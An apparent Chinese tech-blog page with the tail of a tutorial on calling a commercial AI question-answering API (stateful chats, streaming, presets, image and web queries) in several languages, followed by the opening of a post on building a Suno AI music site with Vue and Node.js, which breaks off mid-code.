                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"answer"</span>: <span class="string">"I am an AI language model created by OpenAI and I don't have a personal name. You can simply call me OpenAI or ChatGPT. How can I assist you today?"</span>,</span><br><span class="line">  <span class="attr">"id"</span>: <span class="string">"7cdb293b-2267-4979-a1ec-48d9ad149916"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>第二次请求，将第一次请求返回的 <code>id</code> 字段作为参数传递，同时 <code>stateful</code> 参数依然设置为 <code>true</code>，询问「What I asked you just now?」，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/46a6kd.png" alt=""></p>
                  <p>对应代码如下：</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST 'https://api.acedata.cloud/aichat/conversations' \</span><br><span class="line">-H 'accept: application/json' \</span><br><span class="line">-H 'authorization: Bearer &#123;token&#125;' \</span><br><span class="line">-H 'content-type: application/json' \</span><br><span class="line">-d '&#123;</span><br><span class="line">  "model": "gpt-3.5",</span><br><span class="line">  "stateful": true,</span><br><span class="line">  "id": "7cdb293b-2267-4979-a1ec-48d9ad149916",</span><br><span class="line">  "question": "What I asked you just now?"</span><br><span class="line">&#125;'</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>结果如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"answer"</span>: <span class="string">"You asked me what my name is. As an AI language model, I do not possess a personal identity, so I don't have a specific name. However, you can refer to me as OpenAI or ChatGPT, the names used for this AI model. Is there anything else I can help you with?"</span>,</span><br><span class="line">  <span class="attr">"id"</span>: <span class="string">"7cdb293b-2267-4979-a1ec-48d9ad149916"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，就可以根据上下文回答对应的问题了。</p>
                  <h2 id="流式响应"><a href="#流式响应" class="headerlink" title="流式响应"></a>流式响应</h2>
                  <p>该接口也支持流式响应，这对网页对接十分有用，可以让网页实现逐字显示效果。</p>
                  <p>如果想流式返回响应，可以更改请求头里面的 <code>accept</code> 参数，修改为 <code>application/x-ndjson</code>。</p>
                  <p>修改如图所示，不过调用代码需要有对应的更改才能支持流式响应。</p>
                  <p><img src="https://cdn.acedata.cloud/axt1aa.png" alt=""></p>
                  <p>将 <code>accept</code> 修改为 <code>application/x-ndjson</code> 之后，API 将逐行返回对应的 JSON 数据，在代码层面我们需要做相应的修改来获得逐行的结果。</p>
                  <p>Python 样例调用代码：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://api.acedata.cloud/aichat/conversations"</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"accept"</span>: <span class="string">"application/x-ndjson"</span>,</span><br><span class="line">    <span class="string">"authorization"</span>: <span class="string">"Bearer &#123;token&#125;"</span>,</span><br><span class="line">    <span class="string">"content-type"</span>: <span class="string">"application/json"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">"model"</span>: <span class="string">"gpt-3.5"</span>,</span><br><span class="line">    <span class="string">"stateful"</span>: <span class="literal">True</span>,</span><br><span class="line">    <span class="string">"id"</span>: <span class="string">"7cdb293b-2267-4979-a1ec-48d9ad149916"</span>,</span><br><span class="line">    <span class="string">"question"</span>: <span class="string">"Hello"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, json=payload, headers=headers, stream=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> response.iter_lines():</span><br><span class="line">    print(line.decode())</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>输出效果如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;<span class="attr">"answer"</span>: <span class="string">"Hello"</span>, <span class="attr">"delta_answer"</span>: <span class="string">"Hello"</span>, <span class="attr">"id"</span>: <span class="string">"7cdb293b-2267-4979-a1ec-48d9ad149916"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"answer"</span>: <span class="string">"Hello!"</span>, <span class="attr">"delta_answer"</span>: <span class="string">"!"</span>, <span class="attr">"id"</span>: <span class="string">"7cdb293b-2267-4979-a1ec-48d9ad149916"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"answer"</span>: <span class="string">"Hello! How"</span>, <span class="attr">"delta_answer"</span>: <span class="string">" How"</span>, <span class="attr">"id"</span>: <span class="string">"7cdb293b-2267-4979-a1ec-48d9ad149916"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"answer"</span>: <span class="string">"Hello! How can"</span>, <span class="attr">"delta_answer"</span>: <span class="string">" can"</span>, <span class="attr">"id"</span>: <span class="string">"7cdb293b-2267-4979-a1ec-48d9ad149916"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"answer"</span>: <span class="string">"Hello! How can I"</span>, <span class="attr">"delta_answer"</span>: <span class="string">" I"</span>, <span class="attr">"id"</span>: <span class="string">"7cdb293b-2267-4979-a1ec-48d9ad149916"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"answer"</span>: <span class="string">"Hello! How can I assist"</span>, <span class="attr">"delta_answer"</span>: <span class="string">" assist"</span>, <span class="attr">"id"</span>: <span class="string">"7cdb293b-2267-4979-a1ec-48d9ad149916"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"answer"</span>: <span class="string">"Hello! How can I assist you"</span>, <span class="attr">"delta_answer"</span>: <span class="string">" you"</span>, <span class="attr">"id"</span>: <span class="string">"7cdb293b-2267-4979-a1ec-48d9ad149916"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"answer"</span>: <span class="string">"Hello! How can I assist you today"</span>, <span class="attr">"delta_answer"</span>: <span class="string">" today"</span>, <span class="attr">"id"</span>: <span class="string">"7cdb293b-2267-4979-a1ec-48d9ad149916"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"answer"</span>: <span class="string">"Hello! How can I assist you today?"</span>, <span class="attr">"delta_answer"</span>: <span class="string">"?"</span>, <span class="attr">"id"</span>: <span class="string">"7cdb293b-2267-4979-a1ec-48d9ad149916"</span>&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，响应里面的 <code>answer</code> 即为最新的回答内容，<code>delta_answer</code> 则是新增的回答内容，您可以根据结果来对接到您的系统中。</p>
                  <p>JavaScript 也是支持的，比如 Node.js 的流式调用代码如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">"axios"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> url = <span class="string">"https://api.acedata.cloud/aichat/conversations"</span>;</span><br><span class="line"><span class="keyword">const</span> headers = &#123;</span><br><span class="line">  <span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>,</span><br><span class="line">  Accept: <span class="string">"application/x-ndjson"</span>,</span><br><span class="line">  Authorization: <span class="string">"Bearer &#123;token&#125;"</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> body = &#123;</span><br><span class="line">  question: <span class="string">"Hello"</span>,</span><br><span class="line">  model: <span class="string">"gpt-3.5"</span>,</span><br><span class="line">  stateful: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">axios</span><br><span class="line">  .post(url, body, &#123; <span class="attr">headers</span>: headers, <span class="attr">responseType</span>: <span class="string">"stream"</span> &#125;)</span><br><span class="line">  .then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response.status);</span><br><span class="line">    response.data.on(<span class="string">"data"</span>, (chunk) =&gt; &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(chunk.toString());</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(error);</span><br><span class="line">  &#125;);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>Java 样例代码：</p>
                  <figure class="highlight java">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">String url = <span class="string">"https://api.acedata.cloud/aichat/conversations"</span>;</span><br><span class="line">OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">MediaType mediaType = MediaType.parse(<span class="string">"application/json"</span>);</span><br><span class="line">RequestBody body = RequestBody.create(mediaType, <span class="string">"&#123;\"question\": \"Hello\", \"stateful\": true, \"model\": \"gpt-3.5\"&#125;"</span>);</span><br><span class="line">Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">        .url(url)</span><br><span class="line">        .post(body)</span><br><span class="line">        .addHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/json"</span>)</span><br><span class="line">        .addHeader(<span class="string">"Accept"</span>, <span class="string">"application/x-ndjson"</span>)</span><br><span class="line">        .addHeader(<span class="string">"Authorization"</span>, <span class="string">"Bearer &#123;token&#125;"</span>)</span><br><span class="line">        .build();</span><br><span class="line"></span><br><span class="line">client.newCall(request).enqueue(<span class="keyword">new</span> Callback() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFailure</span><span class="params">(Call call, IOException e)</span> </span>&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResponse</span><span class="params">(Call call, Response response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!response.isSuccessful()) <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Unexpected code "</span> + response);</span><br><span class="line">        <span class="keyword">try</span> (BufferedReader br = <span class="keyword">new</span> BufferedReader(</span><br><span class="line">                <span class="keyword">new</span> InputStreamReader(response.body().byteStream(), <span class="string">"UTF-8"</span>))) &#123;</span><br><span class="line">            String responseLine;</span><br><span class="line">            <span class="keyword">while</span> ((responseLine = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                System.out.println(responseLine);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>其他语言可以另外自行改写，原理都是一样的。</p>
                  <h2 id="模型预设"><a href="#模型预设" class="headerlink" title="模型预设"></a>模型预设</h2>
                  <p>我们知道，OpenAI 相关的 API 有对应的 <code>system_prompt</code> 的概念，就是给整个模型设置一个预设，比如它叫什么名字等等。本 AI 问答 API 也暴露了这个参数，叫做 <code>preset</code>，利用它我们可以给模型增加预设，我们用一个例子来体验下：</p>
                  <p>这里我们额外添加 <code>preset</code> 字段，内容为 <code>You are a professional artist</code>，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/ird6i9.png" alt=""></p>
                  <p>对应代码如下：</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST 'https://api.acedata.cloud/aichat/conversations' \</span><br><span class="line">-H 'accept: application/json' \</span><br><span class="line">-H 'authorization: Bearer &#123;token&#125;' \</span><br><span class="line">-H 'content-type: application/json' \</span><br><span class="line">-d '&#123;</span><br><span class="line">  "model": "gpt-3.5",</span><br><span class="line">  "stateful": true,</span><br><span class="line">  "question": "What can you help me?",</span><br><span class="line">  "preset": "You are a professional artist"</span><br><span class="line">&#125;'</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"answer"</span>: <span class="string">"As a professional artist, I can offer a range of services and assistance depending on your specific needs. Here are a few ways I can help you:\n\n1. Custom Artwork: If you have a specific vision or idea, I can create custom artwork for you. This can include paintings, drawings, digital art, or any other medium you prefer.\n\n2. Commissioned Pieces: If you have a specific subject or concept in mind, I can create commissioned art pieces tailored to your preferences. This could be for personal enjoyment or as a unique gift for someone special.\n\n3. Art Consultation: If you need guidance on art selection, interior design, or how to showcase and display art in your space, I can provide professional advice to help enhance your aesthetic sense and create a cohesive look."</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到这里我们告诉 GPT 他是一个机器人，然后问它可以为我们做什么，他就可以扮演一个机器人的角色来回答问题了。</p>
                  <h2 id="图片识别"><a href="#图片识别" class="headerlink" title="图片识别"></a>图片识别</h2>
                  <p>本 AI 也能支持添加附件进行图片识别，通过 <code>references</code> 传递对应图片链接即可，比如我这里有一张苹果的图片，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/ht05g0.png" alt=""></p>
                  <p>该图片的链接是 <a href="https://cdn.acedata.cloud/ht05g0.png" target="_blank" rel="noopener">https://cdn.acedata.cloud/ht05g0.png</a>，我们直接将其作为 <code>references</code> 参数传递即可，同时需要注意的是，模型必须要选择支持视觉识别的模型，目前支持的是 <code>gpt-4-vision</code>，所以输入如下：</p>
                  <p><img src="https://cdn.acedata.cloud/cstrbq.png" alt=""></p>
                  <p>对应的代码如下：</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST 'https://api.acedata.cloud/aichat/conversations' \</span><br><span class="line">-H 'accept: application/json' \</span><br><span class="line">-H 'authorization: Bearer &#123;token&#125;' \</span><br><span class="line">-H 'content-type: application/json' \</span><br><span class="line">-d '&#123;</span><br><span class="line">  "model": "gpt-4-vision",</span><br><span class="line">  "question": "How many apples in the picture?",</span><br><span class="line">  "references": ["https://cdn.acedata.cloud/ht05g0.png"]</span><br><span class="line">&#125;'</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"answer"</span>: <span class="string">"There are 5 apples in the picture."</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，我们就成功得到了对应图片的回答结果。</p>
                  <h2 id="联网问答"><a href="#联网问答" class="headerlink" title="联网问答"></a>联网问答</h2>
                  <p>本 API 还支持联网模型，包括 GPT-3.5、GPT-4 均能支持，在 API 背后有一个自动搜索互联网并总结的过程，我们可以选择模型为 <code>gpt-3.5-browsing</code> 来体验下，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/x5i8np.png" alt=""></p>
                  <p>代码如下：</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST 'https://api.acedata.cloud/aichat/conversations' \</span><br><span class="line">-H 'accept: application/json' \</span><br><span class="line">-H 'authorization: Bearer &#123;token&#125;' \</span><br><span class="line">-H 'content-type: application/json' \</span><br><span class="line">-d '&#123;</span><br><span class="line">  "model": "gpt-3.5-browsing",</span><br><span class="line">  "question": "What's the weather of New York today?"</span><br><span class="line">&#125;'</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"answer"</span>: <span class="string">"The weather in New York today is as follows:\n- Current Temperature: 16°C (60°F)\n- High: 16°C (60°F)\n- Low: 10°C (50°F)\n- Humidity: 47%\n- UV Index: 6 of 11\n- Sunrise: 5:42 am\n- Sunset: 8:02 pm\n\nIt's overcast with a chance of occasional showers overnight, and the chance of rain is 50%.\nFor more details, you can visit [The Weather Channel](https://weather.com/weather/tenday/l/96f2f84af9a5f5d452eb0574d4e4d8a840c71b05e22264ebdc0056433a642c84).\n\nIs there anything else you'd like to know?"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，这里它自动联网搜索了 The Weather Channel 网站，并获得了里面的信息，然后进一步返回了实时结果。</p>
                  <blockquote>
                    <p>如果对模型回答质量有更高要求，可以将模型更换为 <code>gpt-4-browsing</code>，回答效果会更好。</p>
                  </blockquote>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2024-05-30 04:09:22" itemprop="dateCreated datePublished" datetime="2024-05-30T04:09:22+08:00">2024-05-30</time>
                </span>
                <span id="/42346.html" class="post-meta-item leancloud_visitors" data-flag-title="如何用 AI 问答 API 彻底改变用户体验！" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>9.1k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>8 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/42344.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 人工智能 <i class="label-arrow"></i>
                  </a>
                  <a href="/42344.html" class="post-title-link" itemprop="url">五分钟搭建自己的AI音乐站点率</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>在这个数字化时代，人工智能技术正以惊人的速度改变着我们的生活方式和创造方式。音乐作为一种最直接、最感性的艺术形式，自然也成为了人工智能技术的应用场景之一。今天，我们将以 Vue 和 Node.js 为基础，利用现有的 API 来快速搭建一个 Suno AI 音乐站点。让我们一起探索这个令人兴奋的过程吧！</p>
                  <p><img src="https://cdn.acedata.cloud/qky8lk.png" alt=""></p>
                  <h2 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a>一、准备工作</h2>
                  <p>在动手之前，我们需要确保已经准备好了必要的环境和工具：</p>
                  <p>Vue 和 Node.js 环境：确保你的开发环境中已经配置好了 Vue 和 Node.js，这将是我们构建前端和后端的基础。</p>
                  <p>文本编辑器或 IDE：选择你熟悉和喜欢的文本编辑器，如 VS Code、Sublime Text 等。</p>
                  <p>Suno AI音乐API密钥：这是我们生成音乐所需的关键。这里我们选择的是Acedata提供的Suno API,注册方法如下：</p>
                  <p>我们先到 <a href="https://platform.acedata.cloud/documents/4da95d9d-7722-4a72-857d-bf6be86036e9?inviter_id=aef91f35-f7f9-494d-bcf6-3a533440101f" target="_blank" rel="noopener">Suno Audios Generation API</a> 页面申请Suno API 服务：</p>
                  <p><img src="https://cdn.acedata.cloud/l5o343.png" alt=""></p>
                  <p>如果你尚未登录或注册，会跳转到登录页面邀请您来注册和登录，注册登录之后会自动返回当前页面。</p>
                  <p>在首次申请时会有免费额度赠送，可以免费使用该 API。申请了API后，在 Credentials 查找到 Token,点击复制这个值备用，类似这样的：8125d23343388839c6e</p>
                  <p><img src="https://cdn.acedata.cloud/qbg8t4.png" alt=""></p>
                  <p>好了，现在，我们获得了 Suno API,下面就可以来快速的搭建 AI 音乐生成平台了。</p>
                  <h2 id="二、搭建前端和后端"><a href="#二、搭建前端和后端" class="headerlink" title="二、搭建前端和后端"></a>二、搭建前端和后端</h2>
                  <h3 id="1-创建-Vue-项目"><a href="#1-创建-Vue-项目" class="headerlink" title="1. 创建 Vue 项目"></a>1. 创建 Vue 项目</h3>
                  <p>为了更清晰地组织前端和后端代码，我们将项目目录结构分为两个主要部分：frontend 和 backend。以下是具体的目录结构和说明：</p>
                  <h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3>
                  <figure class="highlight stylus">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">suno-music-site/</span><br><span class="line">│</span><br><span class="line">├── backend/</span><br><span class="line">│   ├── node_modules/</span><br><span class="line">│   ├── package.json</span><br><span class="line">│   ├── package-lock.json</span><br><span class="line">│   └── server.js</span><br><span class="line">│</span><br><span class="line">├── frontend/</span><br><span class="line">│   ├── node_modules/</span><br><span class="line">│   ├── public/</span><br><span class="line">│   ├── src/</span><br><span class="line">│   │   ├── assets/</span><br><span class="line">│   │   ├── components/</span><br><span class="line">│   │   ├── App.vue</span><br><span class="line">│   │   ├── main.js</span><br><span class="line">│   ├── package.json</span><br><span class="line">│   ├── package-lock.json</span><br><span class="line">│   └── vue<span class="selector-class">.config</span>.js</span><br><span class="line">│</span><br><span class="line">└── README.md</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>我们创建一个 suno-music-site 目录。</p>
                  <h3 id="2-创建后端"><a href="#2-创建后端" class="headerlink" title="2.创建后端"></a>2.创建后端</h3>
                  <p>创建后端目录和文件，在项目根目录下创建 backend 目录，并进入该目录：</p>
                  <figure class="highlight dos">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="built_in">mkdir</span> backend</span><br><span class="line"><span class="built_in">cd</span> backend</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>初始化 Node.js 项目</p>
                  <p>在 backend 目录下初始化 Node.js 项目：</p>
                  <figure class="highlight coffeescript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="built_in">npm</span> init -y</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>安装 Express 和其他依赖<br>安装 Express 和所需的依赖包：</p>
                  <figure class="highlight crmsh">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">npm install express body-parser <span class="keyword">node</span><span class="title">-fetch</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>创建 server.js<br>在 backend 目录下创建 server.js 文件，并添加以下代码：<br>
                  <figure class="highlight typescript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"><span class="keyword">const</span> fetch = <span class="built_in">require</span>(<span class="string">'node-fetch'</span>).default; <span class="comment">// 使用CommonJS版本的node-fetch</span></span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">'cors'</span>); <span class="comment">// 引入cors中间件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">app.use(cors()); <span class="comment">// 使用cors中间件</span></span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/generate-music'</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; 